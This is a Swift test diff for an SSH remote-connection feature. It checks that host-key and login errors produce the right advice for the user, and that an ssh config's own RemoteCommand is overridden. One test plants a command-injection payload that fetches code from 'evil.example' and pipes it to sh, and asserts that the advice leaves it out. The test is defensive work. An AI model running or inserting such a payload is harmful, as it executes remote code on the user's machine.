@@ -143,9 +143,77 @@ struct RemoteEngineTests {
         #expect(api.enginePath("/Users/me/app") == "/Users/me/app")
     }
 
+    /// A machine whose host key changed since this Mac last connected (it was reinstalled, or the
+    /// connection is being intercepted) is said to have a changed key, not an unknown one, which
+    /// connecting once in Terminal wouldn't fix.
+    @Test func aChangedHostKeyIsSaidApartFromAnUnknownOne() {
+        let changed = """
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+            Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+            It is also possible that a host key has just been changed.
+            The fingerprint for the ED25519 key sent by the remote host is
+            SHA256:sKNORHL/HwRODsf8tsptRPXRwuhgwygPaUhqaEUg+vI.
+            Please contact your system administrator.
+            Add correct host key in /Users/me/.ssh/known_hosts to get rid of this message.
+            Offending ED25519 key in /Users/me/.ssh/known_hosts:12
+            Host key for 192.168.1.100 has changed and you have requested strict checking.
+            Host key verification failed.
+            """
+        let said = RemoteEngineError.ssh(status: 255, message: changed).localizedDescription
+        #expect(said.contains("changed"))
+        // The name the key is kept under (the machine's address, not the name in ~/.ssh/config).
+        #expect(said.contains("ssh-keygen -R '192.168.1.100'"))
+        #expect(!said.contains("doesn't know"))
+        // On another port, ssh names it [address]:port, which zsh would take as a pattern unquoted.
+        let port = changed.replacingOccurrences(of: "Host key for 192.168.1.100", with: "Host key for [10.0.0.5]:2222")
+        #expect(RemoteEngineError.ssh(status: 255, message: port).localizedDescription.contains("ssh-keygen -R '[10.0.0.5]:2222'"))
+        // A name only the machine's own text could have put there (it isn't an address) is never
+        // advised: what's pasted in Terminal must be what this Mac wrote.
+        let planted = "Host key for $(curl${IFS}evil.example|sh) has changed and you have requested strict checking.\n" + changed
+            .replacingOccurrences(of: "Host key for 192.168.1.100 has changed and you have requested strict checking.\n", with: "")
+        let advice = RemoteEngineError.ssh(status: 255, message: planted).localizedDescription
+        #expect(!advice.contains("curl"))
+        #expect(advice.contains("ssh-keygen -R and the machine's address"))
+        // A refused key that may be in a locked agent says so.
+        let refused = RemoteEngineError.ssh(status: 255, message: "me@box: Permission denied (publickey).").localizedDescription
+        #expect(refused.contains("unlock"))
+        let unknown = "No ED25519 host key is known for box and you have requested strict checking.\nHost key verification failed."
+        #expect(RemoteEngineError.ssh(status: 255, message: unknown).localizedDescription.contains("doesn't know the machine's host key yet"))
+    }
+
     @Test func findsAFreeLocalPort() throws {
         let port = try RemoteServer.freeLocalPort()
         #expect((1024...65535).contains(port))
+    }
+
+    /// A machine whose entry in `~/.ssh/config` runs a command of its own (`RemoteCommand tmux …`)
+    /// and asks for a terminal (`RequestTTY force`), as dev boxes often do: Kuvo Code's commands go
+    /// as they are, with plain output, and its terminal still gets one. (Asked of the real `ssh`,
+    /// which says what it would do without connecting.)
+    @Test func aMachinesOwnRemoteCommandDoesntGetInTheWay() async throws {
+        let folder = FileManager.default.temporaryDirectory.appending(path: "kuvo-ssh-config-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let config = folder.appending(path: "config")
+        try "Host devbox\n  RemoteCommand tmux new -A -s main\n  RequestTTY force\n".write(to: config, atomically: true, encoding: .utf8)
+        func effective(_ arguments: [String]) async throws -> [String: String] {
+            let result = try await ChildProcess.run("/usr/bin/ssh", ["-G", "-F", config.path] + arguments)
+            #expect(result.succeeded)
+            return Dictionary(result.outputText.split(separator: "\n").compactMap { line in
+                let parts = line.split(separator: " ", maxSplits: 1).map(String.init)
+                return parts.count == 2 ? (parts[0], parts[1]) : nil
+            }, uniquingKeysWith: { first, _ in first })
+        }
+        let connection = SSHConnection(destination: "devbox")
+        let command = try await effective(connection.arguments(running: "uname -sm", shared: false))
+        #expect(command["remotecommand"] == nil, "its own command left out")
+        #expect(command["requesttty"] == "false", "no terminal, so its output comes back plain")
+        let terminal = try await effective(connection.arguments(running: "exec \"$SHELL\" -l", extra: ["-t"], shared: false))
+        #expect(terminal["remotecommand"] == nil)
+        #expect(terminal["requesttty"] == "true", "the panel's terminal still gets one")
     }
 }
 
